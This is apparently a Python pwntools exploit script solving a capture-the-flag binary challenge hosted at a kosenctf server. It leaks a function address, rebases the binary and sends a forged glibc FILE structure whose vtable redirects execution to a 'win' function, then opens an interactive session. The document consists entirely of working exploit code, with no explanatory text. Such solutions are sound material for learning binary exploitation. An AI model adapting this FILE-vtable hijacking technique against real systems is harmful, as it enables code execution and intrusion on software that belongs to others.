from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
#"""
HOST = "pwn.kosenctf.com"
PORT = 9003
"""
HOST = "localhost"
PORT = 7777
#"""
if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
off_win = 0xa5a
off_buf = 0x202060
off_stream = 0x202260

def exploit():
	conn.recvuntil("> = ")
	addr_win = int(conn.recvline(), 16)
	bin_base = addr_win - off_win
	addr_buf = bin_base + off_buf
	
	fake_file = p64(0xfbad2498) # _flags
	#fake_file = p64(0xfbad0498) # _flags
	fake_file += p64(addr_buf+0x150)	# _read_ptr
	fake_file += p64(addr_buf+0x150)	# _read_end
	fake_file += p64(addr_buf+0x150)	# _read_base
	fake_file += p64(addr_buf+0x150)	# _write_base
	fake_file += p64(addr_buf+0x150)	# _write_ptr
	fake_file += p64(addr_buf+0x150)	# _write_end
	fake_file += p64(addr_buf+0x150)	# _buf_base
	fake_file += p64(addr_buf+0x150)	# _buf_end
	fake_file += p64(0)*4		# hoge
	fake_file += p64(addr_buf)		# *_chain
	fake_file += p64(3)			# _fileno
	fake_file += p64(0)*2		# hoge
	fake_file += p64(addr_buf+0xe0)		# lock
	fake_file += p64(0xffffffffffffffff)	#
	fake_file += p64(0)		# hoge
	fake_file += p64(addr_buf)		# hoge
	fake_file += p64(0)*3		# hoge
	fake_file += p64(0xffffffff)
	fake_file += p64(0)*2		# hoge
	fake_file += p64(addr_buf+0x100)	# vtable
	fake_file += "\x00"*(0x100-len(fake_file))
	fake_file += p64(addr_win)*20
	fake_file += "\x00"*(0x200-len(fake_file))
	fake_file += p64(addr_buf)
	fake_file += p64(0)*5
	fake_file += p64(addr_buf)
	
	conn.sendline(fake_file)
	print hex(bin_base)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
